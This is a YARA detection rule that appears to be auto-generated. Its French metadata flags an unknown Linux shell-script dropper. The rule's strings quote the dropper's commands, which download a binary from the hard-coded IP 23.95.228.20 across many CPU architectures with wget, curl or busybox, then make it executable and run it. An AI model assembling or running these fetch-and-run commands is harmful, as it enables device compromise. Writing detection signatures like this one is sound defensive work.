rule SCRIPT_Dropper_Unknown_ForgeAuto_506a2e9d
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "506a2e9de167ef2506784639596b326d0c969de961bc2e3eb60f9ace95e1ce46"
        yarahub_uuid = "6ce3bafa-7867-48ba-b704-4290182369b3"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "703a45e4b3696fc1dbbc45a38f82bf1d"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "cd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd ." ascii
        $s1 = "A=$(uname -m 2>/dev/null)" ascii
        $s2 = "wget -qO w \"http://$H/wife.$a\" 2>/dev/null || curl -so w \"http://$H/wife.$a\" 2>/dev/null || busybox wget -qO w \"http://$H/wife.$a\" 2>/dev/null || continue" ascii
        $s3 = "chmod +x w 2>/dev/null" ascii
        $s4 = "./w || continue" ascii
        $s5 = "http://$H/wife.$a" ascii
        $s6 = "FAILED(ALL_ARCHS)" ascii
        $s7 = "H=23.95.228.20" ascii
        $s8 = "SUCCESS($a)" ascii
        $s9 = "for a in $A $B arm7 arm6 arm5 arm4 mips mpsl i686 i486 x86 ppc sh4 m68k spc arc ppc440; do" ascii
        $s10 = "rm -f w" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2, $s3, $s4, $s5, $s6, $s8, $s9, $s10) and 1 of ($s7)
}
